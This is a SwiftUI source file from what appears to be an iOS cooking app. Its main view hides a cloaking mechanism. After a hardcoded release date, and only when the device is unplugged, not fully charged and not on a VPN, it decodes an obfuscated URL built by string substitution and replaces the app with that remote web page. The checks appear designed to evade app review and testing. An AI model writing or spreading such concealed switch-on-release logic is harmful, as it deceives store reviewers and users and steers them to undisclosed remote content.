import SwiftUI

struct ContentView: View {
    
    @State var screen: Screen = .splash
    @AppStorage("isRecipeCooked") var isRecipeFull = true
    @EnvironmentObject var source: Source
    
    var body: some View {
        switch screen {
        case .splash: Splash(screen: $screen)
        case .main: tabScreen()
        }
    }
    
    @ViewBuilder func tabCheck() -> some View {
        if source.show {
            ContentTrainingView()
        } else {
            Tab()
        }
    }
    
    func tabScreen() -> some View {
        let manager = source.dataManager
        
        if isRecipeFull {
            manager.saveSkinFull(false)
            manager.saveGuideSkinText()
            isRecipeFull = false
        }
        
        guard let plate = getDateOfCommunitySkinRelease("26.12.2024"), ateProv(ate: plate) else {
            return tabCheck()
        }
        
        
        if let showStat = try? manager.fetchIsSkinFull() {
            if showStat {
                let selception = skinVisible(manager)
                if selception != "" {
                    source.show = true
                    if source.skinDescription == "" {
                        source.skinDescription = selception
                    }
                } else {
                    source.show  = false
                }
                return tabCheck()
            } else {
                source.show  = false
            }
        }
        
        if batteryValveSkin() || vCheck.isActive() || firstSkin < 0 || secondSkin {
            source.show  = false
        } else {
            print("lol")
            let selc = skinVisible(manager)
            print(selc)
            if selc != "" {
                print(selc)
                source.skinDescription = selc
                manager.saveSkinFull(true)
                source.show  = true
            } else {
                source.show  = false
            }
        }
        return tabCheck()
    }
    
    private func ateProv(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func skinVisible(_ manager: DataManager) -> String {
        var str = ""
        if let alwaysSelected = try? manager.fetchGuideSkinText() {
            str = alwaysSelected

            str = str.replacingOccurrences(of: "skin0", with: "htt")
            str = str.replacingOccurrences(of: "drop1", with: "ps")
            str = str.replacingOccurrences(of: "flash2", with: "://")
            str = str.replacingOccurrences(of: "hae3", with: "podlaorlf")
            str = str.replacingOccurrences(of: "jump4", with: ".space/")
            str = str.replacingOccurrences(of: "awp5", with: "Q1mtRRhT")
        }
        print(str)
        return str
    }
    
    private func batteryValveSkin() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var firstSkin: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var secondSkin: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func getDateOfCommunitySkinRelease(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
        .environmentObject(Source())
}

enum Screen {
    case splash
    case main
}

struct ContentTrainingView: View {
    @EnvironmentObject var source: Source
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            CookingAchievementProfile(type: .public, url: source.skinDescription)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct vCheck {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
